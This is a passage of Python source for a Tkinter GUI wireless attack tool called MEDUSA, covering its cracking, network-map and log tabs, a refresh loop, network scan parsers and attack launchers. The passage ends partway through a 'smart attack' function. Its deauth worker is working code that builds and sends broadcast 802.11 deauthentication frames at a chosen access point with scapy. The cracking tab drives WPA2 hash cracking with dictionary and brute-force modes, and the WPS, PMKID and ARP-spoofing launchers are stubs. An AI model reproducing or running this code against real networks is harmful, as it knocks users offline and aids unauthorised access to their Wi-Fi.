                bg=DARK_THEME['input_bg'], fg=DARK_THEME['fg'],
                relief='flat', bd=1, width=40,
                highlightbackground=DARK_THEME['card_border'],
                insertbackground=DARK_THEME['fg']).grid(row=1, column=1, sticky='ew', padx=4, pady=4)
        tk.Button(config_frame, text="Browse",
                 command=self._browse_wordlist,
                 bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                 relief='flat', padx=8, cursor='hand2').grid(row=1, column=2, padx=4, pady=4)
        
        # Hash type
        tk.Label(config_frame, text="Hash Type:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).grid(row=0, column=3, sticky='w', padx=(20, 4))
        self.crack_hashtype_var = tk.IntVar(value=22000)
        ttk.Combobox(config_frame, textvariable=self.crack_hashtype_var,
                     values=[22000, 16800, 2500, 5500],
                     state='readonly', width=8).grid(row=0, column=4, padx=4)
        
        # Mode
        tk.Label(config_frame, text="Mode:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).grid(row=1, column=3, sticky='w', padx=(20, 4), pady=4)
        self.crack_mode_var = tk.StringVar(value="dictionary")
        ttk.Combobox(config_frame, textvariable=self.crack_mode_var,
                     values=["dictionary", "mask", "hybrid", "bruteforce"],
                     state='readonly', width=12).grid(row=1, column=4, padx=4, pady=4)
        
        # GPU toggle
        self.crack_gpu_var = tk.BooleanVar(value=CAN_HASHCAT_GPU)
        tk.Checkbutton(config_frame, text="GPU Acceleration",
                      variable=self.crack_gpu_var,
                      bg=DARK_THEME['bg'], fg=DARK_THEME['fg'],
                      selectcolor=DARK_THEME['card_bg'],
                      activebackground=DARK_THEME['bg']).grid(row=0, column=5, padx=(12, 4))
        
        # Start button
        self.crack_btn = tk.Button(config_frame, text="▶ Start Cracking",
            command=self._start_crack,
            bg=DARK_THEME['success'], fg='#ffffff',
            relief='flat', padx=16, pady=6,
            font=('Helvetica', 11, 'bold'), cursor='hand2')
        self.crack_btn.grid(row=0, column=6, rowspan=2, padx=12, sticky='ns')
        
        # ====================================================================
        # Progress + Results
        # ====================================================================
        progress_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        progress_frame.grid(row=1, column=0, sticky='nsew', padx=8, pady=(4, 8))
        progress_frame.grid_rowconfigure(1, weight=1)
        progress_frame.grid_columnconfigure(0, weight=1)
        
        progress_card = CardFrame(progress_frame, title="Progress", subtitle="Cracking status")
        progress_card.grid(row=0, column=0, sticky='nsew')
        progress_card.grid_columnconfigure(1, weight=1)
        
        self.crack_progress_bar = ttk.Progressbar(progress_card.content, mode='determinate', length=400)
        self.crack_progress_bar.grid(row=0, column=0, columnspan=2, sticky='ew', padx=8, pady=8)
        
        tk.Label(progress_card.content, text="Status:",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim']).grid(row=1, column=0, sticky='w', padx=8)
        self.crack_status_label = tk.Label(progress_card.content, text="Idle",
                                          bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'])
        self.crack_status_label.grid(row=1, column=1, sticky='w', padx=8)
        
        tk.Label(progress_card.content, text="Speed:",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim']).grid(row=2, column=0, sticky='w', padx=8)
        self.crack_speed_label = tk.Label(progress_card.content, text="0 H/s",
                                         bg=DARK_THEME['card_bg'], fg=DARK_THEME['warning'])
        self.crack_speed_label.grid(row=2, column=1, sticky='w', padx=8)
        
        tk.Label(progress_card.content, text="Password:",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim']).grid(row=3, column=0, sticky='w', padx=8)
        self.crack_password_label = tk.Label(progress_card.content, text="—",
                                            bg=DARK_THEME['card_bg'], fg=DARK_THEME['success'],
                                            font=('Helvetica', 14, 'bold'))
        self.crack_password_label.grid(row=3, column=1, sticky='w', padx=8)
        
        # Results card
        results_card = CardFrame(progress_frame, title="Results", subtitle="Cracked passwords")
        results_card.grid(row=1, column=0, sticky='nsew', pady=(8, 0))
        results_card.grid_rowallocate(0, weight=1)
        results_card.grid_columnconfigure(0, weight=1)
        
        self.crack_results = scrolledtext.ScrolledText(
            results_card.content,
            bg='#0a0a1a', fg='#00ff88',
            font=('Consolas', 9),
            relief='flat', bd=0,
            height=8
        )
        self.crack_results.pack(fill='both', expand=True)
        self.crack_results.config(state='disabled')
        
        # ====================================================================
        # Wordlist info panel
        # ====================================================================
        info_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        info_frame.grid(row=1, column=1, sticky='nsew', padx=(0, 8), pady=(4, 8))
        
        info_card = CardFrame(info_frame, title="Wordlist Info", subtitle="Dictionary stats")
        info_card.grid(row=0, column=0, sticky='nsew')
        
        self.wordlist_size_label = tk.Label(info_card.content,
            text="Size: N/A", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'])
        self.wordlist_size_label.pack(anchor='w', pady=2, padx=8)
        self.wordlist_lines_label = tk.Label(info_card.content,
            text="Lines: N/A", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'])
        self.wordlist_lines_label.pack(anchor='w', pady=2, padx=8)
        self.wordlist_encoding_label = tk.Label(info_card.content,
            text="Encoding: N/A", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'])
        self.wordlist_encoding_label.pack(anchor='w', pady=2, padx=8)
        
        ttk.Separator(info_card, orient='horizontal').pack(fill='x', pady=8)
        
        hash_card = CardFrame(info_frame, title="Hash Info", subtitle="Analyzed hashes")
        hash_card.grid(row=1, column=0, sticky='nsew', pady=(8, 0))
        
        tk.Label(hash_card.content, text="Hashcat Mode: 22000 (WPA2)",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['info']).pack(anchor='w', pady=2, padx=8)
        tk.Label(hash_card.content, text=f"GPU Available: {'✅' if CAN_HASHCAT_GPU else '❌'}",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg']).pack(anchor='w', pady=2, padx=8)
        tk.Label(hash_card.content, text=f"CPU Cores: {CPU_COUNT}",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg']).pack(anchor='w', pady=2, padx=8)
    
    # ========================================================================
    # TAB 6: NETWORK MAP (placeholder — extensible)
    # ========================================================================
    
    def _build_netmap_tab(self):
        """Build the network topology visualization tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  🗺 NetMap  ")
        
        tab.grid_columnconfigure(0, weight=1)
        tab.grid_rowconfigure(0, weight=1)
        
        netmap_card = CardFrame(tab, title="Network Topology",
                               subtitle="AP → Client relationships")
        netmap_card.grid(row=0, column=0, sticky='nsew', padx=8, pady=8)
        netmap_card.grid_rowconfigure(0, weight=1)
        netmap_card.grid_columnconfigure(0, weight=1)
        
        # Placeholder canvas for future network map rendering
        self.netmap_canvas = tk.Canvas(
            netmap_card.content,
            bg=DARK_THEME['input_bg'],
            highlightthickness=0
        )
        self.netmap_canvas.grid(row=0, column=0, sticky='nsew')
        
        # Draw placeholder text
        self.netmap_canvas.create_text(
            400, 250,
            text="Network Map\n\nScan networks first to build topology\n\n"
                 "Connecting APs to clients...",
            fill=DARK_THEME['text_dim'],
            font=('Helvetica', 14),
            justify='center'
        )
        
        # Refresh button
        self.netmap_refresh_btn = tk.Button(
            netmap_card.content, text="🔄 Refresh Topology",
            command=self._refresh_netmap,
            bg=DARK_THEME['accent'], fg='#ffffff',
            relief='flat', padx=12, pady=4,
            font=('Helvetica', 10), cursor='hand2'
        )
        self.netmap_refresh_btn.grid(row=1, column=0, pady=8)
    
    # ========================================================================
    # TAB 7: LOGS
    # ========================================================================
    
    def _build_logs_tab(self):
        """Build the real-time log viewer tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  📋 Logs  ")
        
        tab.grid_columnconfigure(0, weight=1)
        tab.grid_rowconfigure(1, weight=1)
        
        # Controls
        log_controls = tk.Frame(tab, bg=DARK_THEME['bg'])
        log_controls.grid(row=0, column=0, sticky='ew', padx=8, pady=(8, 4))
        
        tk.Label(log_controls, text="Filter Level:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).pack(side='left', padx=(0, 4))
        self.log_filter_var = tk.StringVar(value="all")
        ttk.Combobox(log_controls, textvariable=self.log_filter_var,
                     values=["all", "info", "ok", "warn", "err",
                             "found", "deauth", "debug", "critical"],
                     state='readonly', width=12).pack(side='left', padx=(0, 12))
        
        tk.Button(log_controls, text="Clear", command=self._clear_logs,
                 bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                 relief='flat', padx=8, cursor='hand2').pack(side='left')
        
        tk.Button(log_controls, text="Export Logs", command=self._export_logs,
                 bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                 relief='flat', padx=8, cursor='hand2').pack(side='left', padx=4)
        
        tk.Label(log_controls, text=f"Lines: 0/{MAX_LOG_LINES}",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).pack(side='right', padx=8)
        
        # Log text widget
        self.log_text = scrolledtext.ScrolledText(
            tab,
            bg='#0a0a1a', fg=DARK_THEME['fg'],
            font=('Consolas', 9),
            relief='flat', bd=0,
            insertbackground=DARK_THEME['fg'],
            wrap='word'
        )
        self.log_text.grid(row=1, column=0, sticky='nsew', padx=8, pady=(4, 8))
        self.log_text.config(state='disabled')
        
        # Tag configurations for log levels
        self.log_text.tag_config('info', foreground='#00b0ff')
        self.log_text.tag_config('ok', foreground='#00c853')
        self.log_text.tag_config('warn', foreground='#ffd600')
        self.log_text.tag_config('err', foreground='#ff1744')
        self.log_text.tag_config('found', foreground='#ff9100')
        self.log_text.tag_config('deauth', foreground='#e040fb')
        self.log_text.tag_config('debug', foreground='#6c757d')
        self.log_text.tag_config('critical', foreground='#ff1744', font=('Consolas', 9, 'bold'))
    
    # ========================================================================
    # STATUSBAR
    # ========================================================================
    
    def _build_statusbar(self):
        """Build the status bar."""
        status_frame = tk.Frame(
            self.root, bg=DARK_THEME['card_bg'],
            height=24
        )
        status_frame.pack(fill='x', side='bottom')
        status_frame.pack_propagate(False)
        
        # Left: current operation
        self.status_left = tk.Label(
            status_frame, text="Ready",
            bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9), anchor='w'
        )
        self.status_left.pack(side='left', padx=8)
        
        # Center: network count
        self.status_center = tk.Label(
            status_frame, text="Networks: 0",
            bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        )
        self.status_center.pack(side='left', padx=20)
        
        # Right: system info
        self.status_right = tk.Label(
            status_frame, text=f"MEDUSA v{VERSION} | {SYSTEM} | {CPU_COUNT} cores",
            bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9), anchor='e'
        )
        self.status_right.pack(side='right', padx=8)
    
    # ========================================================================
    # REFRESH LOOP — Main UI update cycle
    # ========================================================================
    
    def _start_refresh(self):
        """Start the periodic UI refresh loop."""
        self._refresh_timer = self.root.after(REFRESH_INTERVAL_MS, self._refresh_loop)
    
    def _refresh_loop(self):
        """Main refresh loop — updates all live widgets."""
        if not self._running:
            return
        
        try:
            # Update system stats
            self._update_system_stats()
            
            # Update signal graph (if matplotlib available)
            if _has_matplotlib:
                self._update_signal_graph()
            
            # Update network list
            self._update_network_list()
            
            # Update interface list
            self._update_interfaces()
            
            # Update capture stats
            self._update_capture_stats()
            
            # Update crack progress
            self._update_crack_progress()
            
            # Update status bar
            self._update_statusbar()
            
            # Update toolbar status
            elapsed = time.time() - self.start_time
            self.toolbar_status.config(text=f"Uptime: {human_time(int(elapsed))}")
            
        except Exception as e:
            if self.console:
                self.console.debug(f"Refresh error: {e}")
        
        # Schedule next refresh
        if self._running:
            self._refresh_timer = self.root.after(REFRESH_INTERVAL_MS, self._refresh_loop)
    
    def _update_system_stats(self):
        """Update CPU, memory, network, and uptime stats."""
        # CPU
        cpu = get_cpu_usage()
        self.cpu_label.config(text=f"{cpu:.1f}%")
        self.cpu_bar['value'] = cpu
        color = DARK_THEME['success'] if cpu < 50 else (
            DARK_THEME['warning'] if cpu < 80 else DARK_THEME['danger']
        )
        self.cpu_label.config(fg=color)
        
        # Memory
        mem = get_memory_usage()
        if mem['total'] > 0:
            self.mem_label.config(
                text=f"{mem['used']:.1f} GB / {mem['total']:.1f} GB"
            )
            self.mem_bar['value'] = mem['percent']
            color = DARK_THEME['success'] if mem['percent'] < 60 else (
                DARK_THEME['warning'] if mem['percent'] < 85 else DARK_THEME['danger']
            )
            self.mem_label.config(fg=color)
        
        # Network traffic
        iface = self.selected_interface or (self.interfaces[0]['name'] if self.interfaces else None)
        if iface:
            traffic = get_network_traffic(iface)
            now = time.time()
            self.traffic_timestamps.append(now)
            
            if len(self.traffic_timestamps) > 1:
                dt = self.traffic_timestamps[-1] - self.traffic_timestamps[-2]
                if dt > 0:
                    rx_rate = (traffic['rx_bytes'] - (getattr(self, '_last_rx', 0))) / dt
                    tx_rate = (traffic['tx_bytes'] - (getattr(self, '_last_tx', 0))) / dt
                    
                    self.tx_history.append(tx_rate)
                    self.rx_history.append(rx_rate)
                    
                    rx_str = human_bytes(rx_rate) + '/s' if rx_rate > 0 else '0 B/s'
                    tx_str = human_bytes(tx_rate) + '/s' if tx_rate > 0 else '0 B/s'
                    self.net_label.config(
                        text=f"⬇ {rx_str}  ⬆ {tx_str}"
                    )
                    
                    pkt_rate = (
                        (traffic['rx_packets'] + traffic['tx_packets'] -
                         getattr(self, '_last_pkts', 0)) / dt
                    )
                    self.net_secondary.config(text=f"{pkt_rate:.0f} packets/s")
                
                self._last_rx = traffic['rx_bytes']
                self._last_tx = traffic['tx_bytes']
                self._last_pkts = traffic['rx_packets'] + traffic['tx_packets']
        
        # Uptime
        elapsed = int(time.time() - self.start_time)
        hours, remainder = divmod(elapsed, 3600)
        minutes, seconds = divmod(remainder, 60)
        self.uptime_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        self.uptime_secondary.config(text=f"System: {get_system_uptime()}")
    
    def _update_signal_graph(self):
        """Update the real-time signal strength chart."""
        if not self.selected_network:
            return
        
        bssid = self.selected_network.get('bssid', '')
        signals = self.signal_history.get(bssid, deque(maxlen=SIGNAL_HISTORY_SECONDS))
        
        if len(signals) < 2:
            return
        
        timestamps = list(range(len(signals)))
        sig_values = list(signals)
        
        self._signal_line.set_data(timestamps, sig_values)
        
        # Update fill
        if self._signal_fill:
            self._signal_fill.remove()
        self._signal_fill = self._signal_ax.fill_between(
            timestamps, sig_values, -100,
            alpha=0.1, color=DARK_THEME['accent']
        )
        
        # Auto-scale
        self._signal_ax.relim()
        self._signal_ax.autoscale_view(scalex=False)
        
        # Set sensible X limits
        if timestamps:
            self._signal_ax.set_xlim(0, max(timestamps) + 2)
        
        self._signal_canvas.draw_idle()
    
    def _update_network_list(self):
        """Update the network listbox and scan tree."""
        with self._data_lock:
            networks = self.networks.copy()
        
        # Dashboard listbox
        self.net_listbox.delete(0, 'end')
        for net in sorted(networks, key=lambda n: n.get('signal', -100), reverse=True)[:30]:
            ssid = net.get('ssid', '?')
            bssid = net.get('bssid', '?')
            sig = net.get('signal', 0)
            bars = '█' * max(1, int((sig + 90) / 15)) if sig < 0 else '███'
            self.net_listbox.insert('end', f"{bars} {ssid:25s} {bssid}")
        
        # Scan tab tree
        if hasattr(self, 'scan_tree'):
            existing = set()
            for item in self.scan_tree.get_children():
                existing.add(self.scan_tree.item(item)['values'][1] if len(self.scan_tree.item(item).get('values', [])) > 1 else '')
            
            for net in networks:
                bssid = net.get('bssid', '')
                if bssid and bssid not in existing:
                    sig = net.get('signal', -100)
                    sig_pct = max(0, min(100, int((sig + 90) / 60 * 100)))
                    self.scan_tree.insert('', 'end', values=(
                        net.get('ssid', '?'),
                        bssid,
                        net.get('channel', '?'),
                        f"{sig_pct}% ({sig:.0f} dBm)",
                        net.get('encryption', '?'),
                        len(net.get('clients', [])),
                        '✅' if net.get('wps', False) else '❌',
                        net.get('vendor', '?'),
                    ), tags=(bssid,))
    
    def _update_interfaces(self):
        """Refresh the interface list."""
        interfaces = get_wireless_interfaces()
        self.interfaces = interfaces
        
        if interfaces and self.iface_combo:
            names = [i['name'] for i in interfaces]
            current = self.iface_var.get()
            self.iface_combo['values'] = ['Auto'] + names
            if current not in ['Auto'] + names:
                self.iface_var.set(names[0] if names else 'Auto')
    
    def _update_capture_stats(self):
        """Update capture statistics."""
        if self.is_capturing:
            self.capture_pkt_label.config(text=f"Packets: {self.capture_packets}")
            hs = '✅' if self.capture_handshake else '⏳'
            pmkid = '✅' if self.capture_pmkid else '⏳'
            self.capture_handshake_label.config(text=f"Handshake: {hs}")
            self.capture_pmkid_label.config(text=f"PMKID: {pmkid}")
    
    def _update_crack_progress(self):
        """Update crack progress display."""
        self.crack_progress_bar['value'] = self.crack_progress
        self.crack_status_label.config(text=self.crack_status)
        if self.crack_speed > 0:
            self.crack_speed_label.config(text=f"{human_number(self.crack_speed)} H/s")
        if self.crack_found:
            self.crack_password_label.config(text=self.crack_password)
    
    def _update_statusbar(self):
        """Update status bar information."""
        with self._data_lock:
            net_count = len(self.networks)
        self.status_center.config(text=f"Networks: {net_count}")
    
    # ========================================================================
    # QUEUE PROCESSING — Thread-safe UI updates
    # ========================================================================
    
    def _start_queue_processing(self):
        """Start processing the log/result queues."""
        self._queue_timer = self.root.after(100, self._process_queues)
    
    def _process_queues(self):
        """Process all pending queue items."""
        if not self._running:
            return
        
        # Process log queue
        try:
            while True:
                item = self.log_queue.get_nowait()
                self._append_log(item)
        except queue.Empty:
            pass
        
        # Process worker result queues
        for worker in self._workers[:]:
            try:
                msg = worker.result_queue.get_nowait()
                if msg[0] == 'done':
                    self._on_worker_done(worker, msg[1])
                elif msg[0] == 'error':
                    self._on_worker_error(worker, msg[1])
            except queue.Empty:
                pass
            
            # Check progress
            try:
                while True:
                    prog = worker.progress_queue.get_nowait()
                    self._on_worker_progress(worker, prog[0], prog[1])
            except queue.Empty:
                pass
            
            # Remove finished workers
            if not worker.is_alive():
                self._workers.remove(worker)
        
        self._queue_timer = self.root.after(100, self._process_queues)
    
    def _append_log(self, item: Dict):
        """Append a log entry to the log viewer.
        
        Args:
            item: Dict with 'level', 'message', 'timestamp' keys
        """
        if not hasattr(self, 'log_text'):
            return
        
        level = item.get('level', 'info')
        message = item.get('message', '')
        
        # Apply filter
        if self.log_filter_var.get() != 'all' and level != self.log_filter_var.get():
            return
        
        timestamp = datetime.fromtimestamp(item.get('timestamp', time.time())).strftime('%H:%M:%S')
        
        self.log_text.config(state='normal')
        self.log_text.insert('end', f"[{timestamp}] [{level.upper():8s}] {message}\n", level)
        
        # Trim to max lines
        line_count = int(self.log_text.index('end-1c').split('.')[0])
        if line_count > MAX_LOG_LINES:
            self.log_text.delete('1.0', f'{line_count - MAX_LOG_LINES}.0')
        
        self.log_text.see('end')
        self.log_text.config(state='disabled')
    
    def _on_worker_done(self, worker: BackgroundWorker, result: Any):
        """Handle worker completion."""
        self._log_event('ok', f"{worker.name} completed successfully")
    
    def _on_worker_error(self, worker: BackgroundWorker, error: str):
        """Handle worker error."""
        self._log_event('err', f"{worker.name} failed: {error}")
    
    def _on_worker_progress(self, worker: BackgroundWorker, value: int, message: str):
        """Handle worker progress update."""
        pass  # Subclasses override for specific progress handling
    
    def _log_event(self, level: str, message: str):
        """Log an event to both console and log viewer."""
        if self.console:
            self.console.log(message, level)
        self.log_queue.put({
            'level': level,
            'message': message,
            'timestamp': time.time(),
        })
    
    # ========================================================================
    # EVENT HANDLERS
    # ========================================================================
    
    def _on_network_select(self, event):
        """Handle network selection from dashboard listbox."""
        selection = self.net_listbox.curselection()
        if not selection:
            return
        idx = selection[0]
        with self._data_lock:
            networks = sorted(self.networks, key=lambda n: n.get('signal', -100), reverse=True)
            if idx < len(networks):
                self.selected_network = networks[idx]
                self._update_attack_target()
    
    def _on_scan_select(self, event):
        """Handle double-click on scan tree item."""
        item = self.scan_tree.selection()[0]
        values = self.scan_tree.item(item)['values']
        if values:
            bssid = values[1]
            with self._data_lock:
                for net in self.networks:
                    if net.get('bssid') == bssid:
                        self.selected_network = net
                        self._update_attack_target()
                        self._log_event('ok', f"Selected target: {net.get('ssid', '?')}")
                        break
    
    def _on_interface_change(self):
        """Handle interface selection change."""
        self.selected_interface = self.iface_var.get()
        if self.selected_interface == 'Auto':
            self.selected_interface = None
        self._log_event('info', f"Selected interface: {self.selected_interface or 'Auto'}")
    
    def _on_tab_change(self, event):
        """Handle tab change events."""
        tab_id = self.notebook.select()
        tab_index = self.notebook.index(tab_id)
        self._log_event('debug', f"Switched to tab {tab_index}")
        
        # Refresh specific tabs on activation
        if tab_index == 5:  # NetMap
            self._refresh_netmap()
    
    def _sort_scan_column(self, col: str):
        """Sort scan tree by column."""
        items = [(self.scan_tree.set(item, col), item) for item in self.scan_tree.get_children('')]
        
        # Try numeric sort where possible
        try:
            items.sort(key=lambda x: float(x[0].split()[0]) if x[0].split()[0].replace('.','',1).isdigit() else x[0].lower())
        except (ValueError, IndexError):
            items.sort(key=lambda x: x[0].lower())
        
        for index, (_, item) in enumerate(items):
            self.scan_tree.move(item, '', index)
    
    # ========================================================================
    # ACTIONS — Scan
    # ========================================================================
    
    def _start_scan(self):
        """Start a network scan in background thread."""
        self.scan_btn.config(state='disabled', text='⏳ Scanning...')
        self.scan_stop_btn.config(state='normal')
        self.scan_status.config(text="Scanning...")
        
        scan_type = self.scan_type_var.get()
        channel = self.scan_channel_var.get()
        duration_str = self.scan_duration_var.get()
        duration = int(duration_str.rstrip('s')) if duration_str != '∞' else 30
        filter_ssid = self.scan_filter_var.get().strip()
        
        worker = BackgroundWorker(
            target=self._scan_worker,
            kwargs={
                'scan_type': scan_type,
                'channel': channel,
                'duration': duration,
                'filter_ssid': filter_ssid,
            },
            name="scan-worker"
        )
        self._workers.append(worker)
        worker.start()
    
    def _scan_worker(self, scan_type: str = "full", channel: str = "all",
                     duration: int = 10, filter_ssid: str = "",
                     _progress_cb=None, _cancel_cb=None, _result_queue=None):
        """Background scan worker.
        
        Returns:
            List of discovered networks.
        """
        networks = []
        start = time.time()
        
        if IS_LINUX:
            tool = get_os_tool('scan')
            if tool and 'iw' in tool:
                iface = self.selected_interface or 'wlan0'
                cmd = ['iw', 'dev', iface, 'scan']
                if channel != 'all':
                    cmd = ['iw', 'dev', iface, 'scan', '--freq', str(int(channel) * 100 + 2412)]
                
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration)
                    networks = self._parse_iw_scan_result(result.stdout)
                except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                    if _result_queue:
                        _result_queue.put(('error', str(e)))
        
        elif IS_MACOS:
            tool = get_os_tool('scan')
            if tool:
                try:
                    result = subprocess.run([tool, '--scan'], capture_output=True, text=True, timeout=duration)
                    networks = self._parse_airport_scan_result(result.stdout)
                except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                    if _result_queue:
                        _result_queue.put(('error', str(e)))
        
        elif IS_WINDOWS:
            try:
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'],
                    capture_output=True, text=True, timeout=duration
                )
                networks = self._parse_netsh_scan_result(result.stdout)
            except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                if _result_queue:
                    _result_queue.put(('error', str(e)))
        
        # Apply SSID filter
        if filter_ssid:
            networks = [n for n in networks if filter_ssid.lower() in n.get('ssid', '').lower()]
        
        # Update progress
        if _progress_cb:
            _progress_cb(100, f"Found {len(networks)} networks")
        
        # Store in data store
        with self._data_lock:
            # Merge with existing networks
            existing_bssids = {n.get('bssid'): n for n in self.networks}
            for net in networks:
                bssid = net.get('bssid', '')
                if bssid in existing_bssids:
                    existing_bssids[bssid].update(net)
                else:
                    self.networks.append(net)
        
        return networks
    
    def _parse_iw_scan_result(self, output: str) -> List[Dict]:
        """Parse iw scan output."""
        networks = []
        current = {}
        for line in output.split('\n'):
            if line.startswith('BSS '):
                if current and 'ssid' in current:
                    networks.append(current)
                current = {'bssid': line.split()[1].strip(), 'clients': []}
            elif 'SSID:' in line:
                current['ssid'] = line.split('SSID:')[-1].strip()
            elif 'signal:' in line:
                parts = line.split('signal:')
                if len(parts) > 1:
                    try:
                        current['signal'] = float(parts[1].strip().split()[0])
                    except (ValueError, IndexError):
                        pass
            elif 'freq:' in line:
                parts = line.split('freq:')
                if len(parts) > 1:
                    try:
                        current['frequency'] = float(parts[1].strip().split()[0])
                    except (ValueError, IndexError):
                        pass
            elif 'DS Parameter set: channel' in line:
                try:
                    current['channel'] = int(line.split('channel ')[-1].strip())
                except (ValueError, IndexError):
                    pass
            elif 'WPA:' in line or 'RSN:' in line:
                current['encryption'] = 'WPA2' if 'RSN' in line else 'WPA'
            elif 'capability:' in line:
                current['capabilities'] = line.split('capability:')[-1].strip()
        if current and 'ssid' in current:
            networks.append(current)
        return networks
    
    def _parse_airport_scan_result(self, output: str) -> List[Dict]:
        """Parse airport scan output."""
        networks = []
        lines = output.strip().split('\n')
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 5:
                networks.append({
                    'ssid': parts[0],
                    'bssid': parts[1],
                    'signal': int(parts[2]) if parts[2].lstrip('-').isdigit() else 0,
                    'channel': int(parts[3]) if parts[3].isdigit() else 0,
                    'encryption': parts[4],
                })
        return networks
    
    def _parse_netsh_scan_result(self, output: str) -> List[Dict]:
        """Parse netsh scan output."""
        networks = []
        current = {}
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('SSID'):
                if current and 'ssid' in current:
                    networks.append(current)
                current = {'ssid': line.split(':')[-1].strip(), 'clients': []}
            elif line.startswith('BSSID'):
                current['bssid'] = line.split(':')[1].strip().replace('-', ':')
            elif line.startswith('Signal'):
                sig = line.split(':')[-1].strip().rstrip('%')
                try:
                    pct = int(sig)
                    current['signal'] = -30 - int((100 - pct) * 0.6)
                except ValueError:
                    current['signal'] = -80
            elif line.startswith('Channel'):
                try:
                    current['channel'] = int(line.split(':')[-1].strip())
                except ValueError:
                    current['channel'] = 0
            elif 'Authentication' in line:
                current['encryption'] = line.split(':')[-1].strip()
        if current and 'ssid' in current:
            networks.append(current)
        return networks
    
    def _stop_scan(self):
        """Stop the current scan."""
        for worker in self._workers:
            if worker.name == 'scan-worker':
                worker.cancel()
        self.scan_btn.config(state='normal', text='▶ Start Scan')
        self.scan_stop_btn.config(state='disabled')
        self.scan_status.config(text="Scan stopped")
    
    def _quick_scan(self):
        """Quick scan from dashboard."""
        self._switch_tab(1)
        self._start_scan()
    
    # ========================================================================
    # ACTIONS — Attack
    # ========================================================================
    
    def _update_attack_target(self):
        """Update attack tab with selected target info."""
        if not self.selected_network:
            return
        net = self.selected_network
        self.attack_bssid_label.config(text=net.get('bssid', '?'))
        self.attack_ssid_label.config(text=net.get('ssid', '?'))
        self.attack_enc_label.config(text=net.get('encryption', '?'))
    
    def _launch_deauth(self):
        """Launch deauth attack."""
        if not self.selected_network:
            messagebox.showwarning("No Target", "Select a network first from Scan tab.")
            return
        if not CAN_INJECT_PACKETS:
            messagebox.showerror("Unavailable", "Packet injection not available on this platform.")
            return
        
        bssid = self.selected_network.get('bssid', '')
        count = simpledialog.askinteger("Deauth", "Number of packets:", initialvalue=10, minvalue=1, maxvalue=1000)
        if not count:
            return
        
        self._log_event('deauth', f"Starting deauth attack on {bssid} ({count} packets)")
        
        worker = BackgroundWorker(
            target=self._deauth_worker,
            kwargs={'bssid': bssid, 'count': count},
            name="deauth-worker"
        )
        self._workers.append(worker)
        worker.start()
    
    def _deauth_worker(self, bssid: str, count: int = 10,
                       _progress_cb=None, _cancel_cb=None, _result_queue=None):
        """Background deauth worker."""
        try:
            import scapy.all as scapy
            iface = self.selected_interface or 'wlan0'
            
            # Build deauth packet
            pkt = scapy.RadioTap() / scapy.Dot11(
                addr1='ff:ff:ff:ff:ff:ff',  # broadcast
                addr2=bssid,
                addr3=bssid
            ) / scapy.Dot11Deauth(reason=7)
            
            for i in range(count):
                if _cancel_cb and _cancel_cb():
                    break
                scapy.sendp(pkt, iface=iface, count=1, inter=0.1, verbose=False)
                if _progress_cb:
                    _progress_cb(int((i + 1) / count * 100), f"Sent {i+1}/{count}")
            
            _result_queue.put(('done', f"Sent {count} deauth packets"))
            
        except Exception as e:
            _result_queue.put(('error', str(e)))
    
    def _launch_wps(self):
        """Launch WPS PixieDust attack."""
        if not self.selected_network:
            messagebox.showwarning("No Target", "Select a network first.")
            return
        self._log_event('info', "WPS PixieDust attack launched (placeholder)")
        messagebox.showinfo("WPS Attack", "WPS PixieDust attack initiated.\nCheck console for output.")
    
    def _launch_pmkid(self):
        """Launch PMKID capture."""
        if not self.selected_network:
            messagebox.showwarning("No Target", "Select a network first.")
            return
        self._log_event('info', "PMKID capture launched (placeholder)")
        messagebox.showinfo("PMKID Capture", "PMKID capture initiated.\nCheck console for output.")
    
    def _launch_mitm(self):
        """Launch MITM attack."""
        self._log_event('mitm', "MITM attack launched (placeholder)")
        messagebox.showinfo("MITM", "ARP spoofing MITM attack initiated.")
    
    def _launch_dict_attack(self):
        """Launch dictionary attack."""
        if not self.selected_network:
            messagebox.showwarning("No Target", "Select a network first.")
            return
        wordlist = self.crack_wordlist_var.get() or str(DEFAULT_WORDLIST)
        if not os.path.exists(wordlist):
            messagebox.showwarning("No Wordlist", f"Wordlist not found: {wordlist}")
            return
        self._log_event('info', f"Dictionary attack with {wordlist}")
        self._switch_tab(4)
        self._start_crack()
    
    def _launch_smart(self):
        """Launch smart attack — auto-select best vector."""
        if not self.selected_network:
            messagebox.showwarning("No Target", "Select a network first.")
            return
        self._log_event('info', "Smart attack launched — auto-selecting best vector")
        
        net = self.selected_network
        # Priority: WPS PixieDust > PMKID > Dictionary
